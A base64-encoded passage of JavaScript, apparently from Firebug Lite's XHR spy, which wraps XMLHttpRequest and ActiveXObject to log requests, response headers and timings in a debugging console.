QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc2VsZi5zdGF0dXMgPSB4aHJSZXF1ZXN0LnN0YXR1czsNCiAgICAgICAgICAgICAgICBzZWxmLnN0YXR1c1RleHQgPSB4aHJSZXF1ZXN0LnN0YXR1c1RleHQ7DQogICAgICAgICAgICAgICAgc2VsZi5yZXNwb25zZVRleHQgPSB4aHJSZXF1ZXN0LnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBzZWxmLnJlc3BvbnNlWE1MID0geGhyUmVxdWVzdC5yZXNwb25zZVhNTDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH07DQogICAgDQogICAgdmFyIHVwZGF0ZVhIUlByb3BlcnRpZXNJZ25vcmUgPSB7DQogICAgICAgIGNoYW5uZWw6IDEsDQogICAgICAgIG9ucmVhZHlzdGF0ZWNoYW5nZTogMSwNCiAgICAgICAgcmVhZHlTdGF0ZTogMSwNCiAgICAgICAgcmVzcG9uc2VCb2R5OiAxLA0KICAgICAgICByZXNwb25zZVRleHQ6IDEsDQogICAgICAgIHJlc3BvbnNlWE1MOiAxLA0KICAgICAgICBzdGF0dXM6IDEsDQogICAgICAgIHN0YXR1c1RleHQ6IDEsDQogICAgICAgIHVwbG9hZDogMQ0KICAgIH07DQogICAgDQogICAgdmFyIHVwZGF0ZVhIUlByb3BlcnRpZXMgPSBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBmb3IgKHZhciBwcm9wTmFtZSBpbiBzZWxmKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAocHJvcE5hbWUgaW4gdXBkYXRlWEhSUHJvcGVydGllc0lnbm9yZSkNCiAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHByb3BWYWx1ZSA9IHNlbGZbcHJvcE5hbWVdOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChwcm9wVmFsdWUgJiYgIXhoclJlcXVlc3RbcHJvcE5hbWVdKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgeGhyUmVxdWVzdFtwcm9wTmFtZV0gPSBwcm9wVmFsdWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2goRSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvL2NvbnNvbGUubG9nKHByb3BOYW1lLCBFLm1lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfTsNCiAgICANCiAgICB2YXIgbG9nWEhSID0gZnVuY3Rpb24oKSANCiAgICB7DQogICAgICAgIHZhciByb3cgPSBGaXJlYnVnLkNvbnNvbGUubG9nKHNweSwgbnVsbCwgInNweSIsIEZpcmVidWcuU3B5LlhIUik7DQogICAgICAgIA0KICAgICAgICBpZiAocm93KQ0KICAgICAgICB7DQogICAgICAgICAgICBzZXRDbGFzcyhyb3csICJsb2FkaW5nIik7DQogICAgICAgICAgICBzcHkubG9nUm93ID0gcm93Ow0KICAgICAgICB9DQogICAgfTsNCiAgICANCiAgICB2YXIgZmluaXNoWEhSID0gZnVuY3Rpb24oKSANCiAgICB7DQogICAgICAgIHZhciBkdXJhdGlvbiA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpIC0gcmVxU3RhcnRUUzsNCiAgICAgICAgdmFyIHN1Y2Nlc3MgPSB4aHJSZXF1ZXN0LnN0YXR1cyA9PSAyMDA7DQogICAgICAgIA0KICAgICAgICB2YXIgcmVzcG9uc2VIZWFkZXJzVGV4dCA9IHhoclJlcXVlc3QuZ2V0QWxsUmVzcG9uc2VIZWFkZXJzKCk7DQogICAgICAgIHZhciByZXNwb25zZXMgPSByZXNwb25zZUhlYWRlcnNUZXh0ID8gcmVzcG9uc2VIZWFkZXJzVGV4dC5zcGxpdCgvW1xuXHJdLykgOiBbXTsNCiAgICAgICAgdmFyIHJlSGVhZGVyID0gL14oXFMrKTpccyooLiopLzsNCiAgICAgICAgDQogICAgICAgIGZvciAodmFyIGk9MCwgbD1yZXNwb25zZXMubGVuZ3RoOyBpPGw7IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHRleHQgPSByZXNwb25zZXNbaV07DQogICAgICAgICAgICB2YXIgbWF0Y2ggPSB0ZXh0Lm1hdGNoKHJlSGVhZGVyKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKG1hdGNoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBuYW1lID0gbWF0Y2hbMV07DQogICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gbWF0Y2hbMl07DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgLy8gdXBkYXRlIHRoZSBzcHkgbWltZVR5cGUgcHJvcGVydHkgc28gd2UgY2FuIGRldGVjdCB3aGVuIHRvIHNob3cgDQogICAgICAgICAgICAgICAgLy8gY3VzdG9tIHJlc3BvbnNlIHZpZXdlcnMgKHN1Y2ggYXMgSFRNTCwgWE1MIG9yIEpTT04gdmlld2VyKQ0KICAgICAgICAgICAgICAgIGlmIChuYW1lID09ICJDb250ZW50LVR5cGUiKQ0KICAgICAgICAgICAgICAgICAgICBzcHkubWltZVR5cGUgPSB2YWx1ZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvKg0KICAgICAgICAgICAgICAgIGlmIChuYW1lID09ICJMYXN0IE1vZGlmaWVkIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmICghc3B5LmNhY2hlRW50cnkpDQogICAgICAgICAgICAgICAgICAgICAgICBzcHkuY2FjaGVFbnRyeSA9IFtdOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgc3B5LmNhY2hlRW50cnkucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgIG5hbWU6IFtuYW1lXSwNCiAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6IFt2YWx1ZV0NCiAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8qKi8NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBzcHkucmVzcG9uc2VIZWFkZXJzLnB1c2goew0KICAgICAgICAgICAgICAgICAgIG5hbWU6IFtuYW1lXSwNCiAgICAgICAgICAgICAgICAgICB2YWx1ZTogW3ZhbHVlXQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgd2l0aCh7DQogICAgICAgICAgICByb3c6IHNweS5sb2dSb3csIA0KICAgICAgICAgICAgc3RhdHVzOiB4aHJSZXF1ZXN0LnN0YXR1cyA9PSAwID8gDQogICAgICAgICAgICAgICAgICAgICAgICAvLyBpZiB4aHJSZXF1ZXN0LnN0YXR1cyA9PSAwIHRoZW4gYWNjZXNzaW5nIHhoclJlcXVlc3Quc3RhdHVzVGV4dA0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gd2lsbCBjYXVzZSBhbiBlcnJvciwgc28gd2UgbXVzdCBoYW5kbGUgdGhpcyBjYXNlIChJc3N1ZSAzNTA0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgIiIgOiB4aHJSZXF1ZXN0LnN0YXR1cyArICIgIiArIHhoclJlcXVlc3Quc3RhdHVzVGV4dCwgDQogICAgICAgICAgICB0aW1lOiBkdXJhdGlvbiwNCiAgICAgICAgICAgIHN1Y2Nlc3M6IHN1Y2Nlc3MNCiAgICAgICAgfSkNCiAgICAgICAgew0KICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpew0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHNweS5yZXNwb25zZVRleHQgPSB4aHJSZXF1ZXN0LnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyB1cGRhdGUgcm93IGluZm9ybWF0aW9uIHRvIGF2b2lkICJldGhlcm5hbCBzcGlubmluZyBnaWYiIGJ1ZyBpbiBJRSANCiAgICAgICAgICAgICAgICByb3cgPSByb3cgfHwgc3B5LmxvZ1JvdzsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyBpZiBjaHJvbWUgZG9jdW1lbnQgaXMgbm90IGxvYWRlZCwgdGhlcmUgd2lsbCBiZSBubyByb3cgeWV0LCBzbyBqdXN0IGlnbm9yZQ0KICAgICAgICAgICAgICAgIGlmICghcm93KSByZXR1cm47DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgLy8gdXBkYXRlIHRoZSBYSFIgcmVwcmVzZW50YXRpb24gZGF0YQ0KICAgICAgICAgICAgICAgIGhhbmRsZVJlcXVlc3RTdGF0dXMoc3VjY2Vzcywgc3RhdHVzLCB0aW1lKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0sMjAwKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgc3B5LmxvYWRlZCA9IHRydWU7DQogICAgICAgIC8qDQogICAgICAgIC8vIGNvbW1lbnRlZCBiZWNhdXNlIHRoZXkgYXJlIGJlaW5nIHVwZGF0ZWQgYnkgdGhlIHVwZGF0ZVNlbGZQcm9wZXJ0aWVzKCkgZnVuY3Rpb24NCiAgICAgICAgc2VsZi5zdGF0dXMgPSB4aHJSZXF1ZXN0LnN0YXR1czsNCiAgICAgICAgc2VsZi5zdGF0dXNUZXh0ID0geGhyUmVxdWVzdC5zdGF0dXNUZXh0Ow0KICAgICAgICBzZWxmLnJlc3BvbnNlVGV4dCA9IHhoclJlcXVlc3QucmVzcG9uc2VUZXh0Ow0KICAgICAgICBzZWxmLnJlc3BvbnNlWE1MID0geGhyUmVxdWVzdC5yZXNwb25zZVhNTDsNCiAgICAgICAgLyoqLw0KICAgICAgICB1cGRhdGVTZWxmUHJvcGVydGllcygpOw0KICAgIH07DQogICAgDQogICAgdmFyIGhhbmRsZVN0YXRlQ2hhbmdlID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy9GaXJlYnVnLkNvbnNvbGUubG9nKFsib25yZWFkeXN0YXRlY2hhbmdlIiwgeGhyUmVxdWVzdC5yZWFkeVN0YXRlLCB4aHJSZXF1ZXN0LnJlYWR5U3RhdGUgPT0gNCAmJiB4aHJSZXF1ZXN0LnN0YXR1c10pOw0KICAgICAgICANCiAgICAgICAgc2VsZi5yZWFkeVN0YXRlID0geGhyUmVxdWVzdC5yZWFkeVN0YXRlOw0KICAgICAgICANCiAgICAgICAgaWYgKHhoclJlcXVlc3QucmVhZHlTdGF0ZSA9PSA0KQ0KICAgICAgICB7DQogICAgICAgICAgICBmaW5pc2hYSFIoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgeGhyUmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpe307DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIC8vRmlyZWJ1Zy5Db25zb2xlLmxvZyhzcHkudXJsICsgIjogIiArIHhoclJlcXVlc3QucmVhZHlTdGF0ZSk7DQogICAgICAgIA0KICAgICAgICBzZWxmLm9ucmVhZHlzdGF0ZWNoYW5nZSgpOw0KICAgIH07DQogICAgDQogICAgLy8gdXBkYXRlIHRoZSBYSFIgcmVwcmVzZW50YXRpb24gZGF0YQ0KICAgIHZhciBoYW5kbGVSZXF1ZXN0U3RhdHVzID0gZnVuY3Rpb24oc3VjY2Vzcywgc3RhdHVzLCB0aW1lKQ0KICAgIHsNCiAgICAgICAgdmFyIHJvdyA9IHNweS5sb2dSb3c7DQogICAgICAgIEZCTC5yZW1vdmVDbGFzcyhyb3csICJsb2FkaW5nIik7DQogICAgICAgIA0KICAgICAgICBpZiAoIXN1Y2Nlc3MpDQogICAgICAgICAgICBGQkwuc2V0Q2xhc3Mocm93LCAiZXJyb3IiKTsNCiAgICAgICAgDQogICAgICAgIHZhciBpdGVtID0gRkJMLiQkKCIuc3B5U3RhdHVzIiwgcm93KVswXTsNCiAgICAgICAgaXRlbS5pbm5lckhUTUwgPSBzdGF0dXM7DQogICAgICAgIA0KICAgICAgICBpZiAodGltZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGl0ZW0gPSBGQkwuJCQoIi5zcHlUaW1lIiwgcm93KVswXTsNCiAgICAgICAgICAgIGl0ZW0uaW5uZXJIVE1MID0gdGltZSArICJtcyI7DQogICAgICAgIH0NCiAgICB9Ow0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBYTUxIdHRwUmVxdWVzdFdyYXBwZXIgcHVibGljIHByb3BlcnRpZXMgYW5kIGhhbmRsZXJzDQogICAgDQogICAgdGhpcy5yZWFkeVN0YXRlID0gMDsNCiAgICANCiAgICB0aGlzLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCl7fTsNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gWE1MSHR0cFJlcXVlc3RXcmFwcGVyIHB1YmxpYyBtZXRob2RzDQogICAgDQogICAgdGhpcy5vcGVuID0gZnVuY3Rpb24obWV0aG9kLCB1cmwsIGFzeW5jLCB1c2VyLCBwYXNzd29yZCkNCiAgICB7DQogICAgICAgIC8vRmlyZWJ1Zy5Db25zb2xlLmxvZygieGhyUmVxdWVzdCBvcGVuIik7DQogICAgICAgIA0KICAgICAgICB1cGRhdGVTZWxmUHJvcGVydGllcygpOw0KICAgICAgICANCiAgICAgICAgaWYgKHNweS5sb2FkZWQpDQogICAgICAgICAgICBzcHkgPSBuZXcgWEhSU3B5KCk7DQogICAgICAgIA0KICAgICAgICBzcHkubWV0aG9kID0gbWV0aG9kOw0KICAgICAgICBzcHkudXJsID0gdXJsOw0KICAgICAgICBzcHkuYXN5bmMgPSBhc3luYzsNCiAgICAgICAgc3B5LmhyZWYgPSB1cmw7DQogICAgICAgIHNweS54aHJSZXF1ZXN0ID0geGhyUmVxdWVzdDsNCiAgICAgICAgc3B5LnVybFBhcmFtcyA9IHBhcnNlVVJMUGFyYW1zQXJyYXkodXJsKTsNCiAgICAgICAgDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyB4aHJSZXF1ZXN0Lm9wZW4uYXBwbHkgbWF5IG5vdCBiZSBhdmFpbGFibGUgaW4gSUUNCiAgICAgICAgICAgIGlmIChzdXBwb3J0c0FwcGx5KQ0KICAgICAgICAgICAgICAgIHhoclJlcXVlc3Qub3Blbi5hcHBseSh4aHJSZXF1ZXN0LCBhcmd1bWVudHMpOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHhoclJlcXVlc3Qub3BlbihtZXRob2QsIHVybCwgYXN5bmMsIHVzZXIsIHBhc3N3b3JkKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaChlKQ0KICAgICAgICB7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHhoclJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gaGFuZGxlU3RhdGVDaGFuZ2U7DQogICAgICAgIA0KICAgIH07DQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIHRoaXMuc2VuZCA9IGZ1bmN0aW9uKGRhdGEpDQogICAgew0KICAgICAgICAvL0ZpcmVidWcuQ29uc29sZS5sb2coInhoclJlcXVlc3Qgc2VuZCIpOw0KICAgICAgICBzcHkuZGF0YSA9IGRhdGE7DQogICAgICAgIA0KICAgICAgICByZXFTdGFydFRTID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7DQogICAgICAgIA0KICAgICAgICB1cGRhdGVYSFJQcm9wZXJ0aWVzKCk7DQogICAgICAgIA0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgeGhyUmVxdWVzdC5zZW5kKGRhdGEpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoKGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIFhIUiB0aHJvd3Mgb3Igbm90Pw0KICAgICAgICAgICAgLy90aHJvdyBlOw0KICAgICAgICB9DQogICAgICAgIGZpbmFsbHkNCiAgICAgICAgew0KICAgICAgICAgICAgbG9nWEhSKCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghc3B5LmFzeW5jKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHNlbGYucmVhZHlTdGF0ZSA9IHhoclJlcXVlc3QucmVhZHlTdGF0ZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyBzb21ldGltZXMgYW4gZXJyb3IgaGFwcGVucyB3aGVuIGNhbGxpbmcgZmluaXNoWEhSKCkNCiAgICAgICAgICAgICAgICAvLyBJc3N1ZSAzNDIyOiBGaXJlYnVnIExpdGUgYnJlYWtzIEdvb2dsZSBJbnN0YW50IFNlYXJjaA0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgZmluaXNoWEhSKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGNhdGNoKEUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH07DQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIHRoaXMuc2V0UmVxdWVzdEhlYWRlciA9IGZ1bmN0aW9uKGhlYWRlciwgdmFsdWUpDQogICAgew0KICAgICAgICBzcHkucmVxdWVzdEhlYWRlcnMucHVzaCh7bmFtZTogW2hlYWRlcl0sIHZhbHVlOiBbdmFsdWVdfSk7DQogICAgICAgIHJldHVybiB4aHJSZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoaGVhZGVyLCB2YWx1ZSk7DQogICAgfTsNCiAgICANCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgdGhpcy5hYm9ydCA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHhoclJlcXVlc3QuYWJvcnQoKTsNCiAgICAgICAgdXBkYXRlU2VsZlByb3BlcnRpZXMoKTsNCiAgICAgICAgaGFuZGxlUmVxdWVzdFN0YXR1cyhmYWxzZSwgIkFib3J0ZWQiKTsNCiAgICB9Ow0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICB0aGlzLmdldFJlc3BvbnNlSGVhZGVyID0gZnVuY3Rpb24oaGVhZGVyKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHhoclJlcXVlc3QuZ2V0UmVzcG9uc2VIZWFkZXIoaGVhZGVyKTsNCiAgICB9Ow0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICB0aGlzLmdldEFsbFJlc3BvbnNlSGVhZGVycyA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB4aHJSZXF1ZXN0LmdldEFsbFJlc3BvbnNlSGVhZGVycygpOw0KICAgIH07DQogICAgDQogICAgLyoqLw0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBDbG9uZSBYSFIgb2JqZWN0DQoNCiAgICAvLyB4aHJSZXF1ZXN0Lm9wZW4uYXBwbHkgbm90IGF2YWlsYWJsZSBpbiBJRSBhbmQgd2lsbCB0aHJvdyBhbiBlcnJvciBpbiANCiAgICAvLyBJRTYgYnkgc2ltcGx5IHJlYWRpbmcgeGhyUmVxdWVzdC5vcGVuIHNvIHdlIG11c3Qgc25pZmYgaXQNCiAgICB2YXIgc3VwcG9ydHNBcHBseSA9ICFpc0lFNiAmJg0KICAgICAgICAgICAgeGhyUmVxdWVzdCAmJiANCiAgICAgICAgICAgIHhoclJlcXVlc3Qub3BlbiAmJiANCiAgICAgICAgICAgIHR5cGVvZiB4aHJSZXF1ZXN0Lm9wZW4uYXBwbHkgIT0gInVuZGVmaW5lZCI7DQogICAgDQogICAgdmFyIG51bWJlck9mWEhSUHJvcGVydGllcyA9IDA7DQogICAgZm9yICh2YXIgcHJvcE5hbWUgaW4geGhyUmVxdWVzdCkNCiAgICB7DQogICAgICAgIG51bWJlck9mWEhSUHJvcGVydGllcysrOw0KICAgICAgICANCiAgICAgICAgaWYgKHByb3BOYW1lIGluIHVwZGF0ZVNlbGZQcm9wZXJ0aWVzSWdub3JlKQ0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIA0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHByb3BWYWx1ZSA9IHhoclJlcXVlc3RbcHJvcE5hbWVdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaXNGdW5jdGlvbihwcm9wVmFsdWUpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2Ygc2VsZltwcm9wTmFtZV0gPT0gInVuZGVmaW5lZCIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0aGlzW3Byb3BOYW1lXSA9IChmdW5jdGlvbihuYW1lLCB4aHIpew0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBzdXBwb3J0c0FwcGx5ID8NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBpZiB0aGUgYnJvd3NlciBzdXBwb3J0cyBhcHBseSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4geGhyW25hbWVdLmFwcGx5KHhociwgYXJndW1lbnRzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKGEsYixjLGQsZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB4aHJbbmFtZV0oYSxiLGMsZCxlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgfSkocHJvcE5hbWUsIHhoclJlcXVlc3QpOw0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgdGhpc1twcm9wTmFtZV0gPSBwcm9wVmFsdWU7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goRSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy9jb25zb2xlLmxvZyhwcm9wTmFtZSwgRS5tZXNzYWdlKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICAvLyBJRTYgZG9lcyBub3Qgc3VwcG9ydCBmb3IgKHZhciBwcm9wIGluIFhIUikNCiAgICB2YXIgc3VwcG9ydHNYSFJJdGVyYXRvciA9IG51bWJlck9mWEhSUHJvcGVydGllcyA+IDA7DQogICAgDQogICAgLyoqLw0KICAgIA0KICAgIHJldHVybiB0aGlzOw0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBBY3RpdmVYT2JqZWN0IFdyYXBwZXIgKElFNiBvbmx5KQ0KDQp2YXIgX0FjdGl2ZVhPYmplY3Q7DQp2YXIgaXNJRTYgPSAgL21zaWUgNi9pLnRlc3QobmF2aWdhdG9yLmFwcFZlcnNpb24pOw0KDQppZiAoaXNJRTYpDQp7DQogICAgX0FjdGl2ZVhPYmplY3QgPSB3aW5kb3cuQWN0aXZlWE9iamVjdDsNCiAgICANCiAgICB2YXIgeGhyT2JqZWN0cyA9ICIgTVNYTUwyLlhNTEhUVFAuNS4wIE1TWE1MMi5YTUxIVFRQLjQuMCBNU1hNTDIuWE1MSFRUUC4zLjAgTVNYTUwyLlhNTEhUVFAgTWljcm9zb2Z0LlhNTEhUVFAgIjsNCiAgICANCiAgICB3aW5kb3cuQWN0aXZlWE9iamVjdCA9IGZ1bmN0aW9uKG5hbWUpDQogICAgew0KICAgICAgICB2YXIgZXJyb3IgPSBudWxsOw0KICAgICAgICANCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBhY3RpdmVYT2JqZWN0ID0gbmV3IF9BY3RpdmVYT2JqZWN0KG5hbWUpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoKGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGVycm9yID0gZTsNCiAgICAgICAgfQ0KICAgICAgICBmaW5hbGx5DQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICghZXJyb3IpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHhock9iamVjdHMuaW5kZXhPZigiICIgKyBuYW1lICsgIiAiKSAhPSAtMSkNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBYTUxIdHRwUmVxdWVzdFdyYXBwZXIoYWN0aXZlWE9iamVjdCk7DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gYWN0aXZlWE9iamVjdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB0aHJvdyBlcnJvci5tZXNzYWdlOw0KICAgICAgICB9DQogICAgfTsNCn0NCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8vIFJlZ2lzdGVyIHRoZSBYTUxIdHRwUmVxdWVzdFdyYXBwZXIgZm9yIG5vbi1JRTYgYnJvd3NlcnMNCmlmICghaXNJRTYpDQp7DQogICAgdmFyIF9YTUxIdHRwUmVxdWVzdCA9IFhNTEh0dHBSZXF1ZXN0Ow0KICAgIHdpbmRvdy5YTUxIdHRwUmVxdWVzdCA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBuZXcgWE1MSHR0cFJlcXVlc3RXcmFwcGVyKCk7DQogICAgfTsNCn0NCg0KLy8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRkJMLmdldE5hdGl2ZVhIUk9iamVjdCA9IGZ1bmN0aW9uKCkNCnsNCiAgICB2YXIgeGhyT2JqID0gZmFsc2U7DQogICAgdHJ5DQogICAgew0KICAgICAgICB4aHJPYmogPSBuZXcgX1hNTEh0dHBSZXF1ZXN0KCk7DQogICAgfQ0KICAgIGNhdGNoKGUpDQogICAgew0KICAgICAgICB2YXIgcHJvZ2lkID0gWw0KICAgICAgICAgICAgICAgICJNU1hNTDIuWE1MSFRUUC41LjAiLCAiTVNYTUwyLlhNTEhUVFAuNC4wIiwgDQogICAgICAgICAgICAgICAgIk1TWE1MMi5YTUxIVFRQLjMuMCIsICJNU1hNTDIuWE1MSFRUUCIsICJNaWNyb3NvZnQuWE1MSFRUUCINCiAgICAgICAgICAgIF07DQogICAgICAgICAgDQogICAgICAgIGZvciAoIHZhciBpPTA7IGkgPCBwcm9naWQubGVuZ3RoOyArK2kgKSB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB4aHJPYmogPSBuZXcgX0FjdGl2ZVhPYmplY3QocHJvZ2lkW2ldKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoKGUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBmaW5hbGx5DQogICAgew0KICAgICAgICByZXR1cm4geGhyT2JqOw0KICAgIH0NCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqK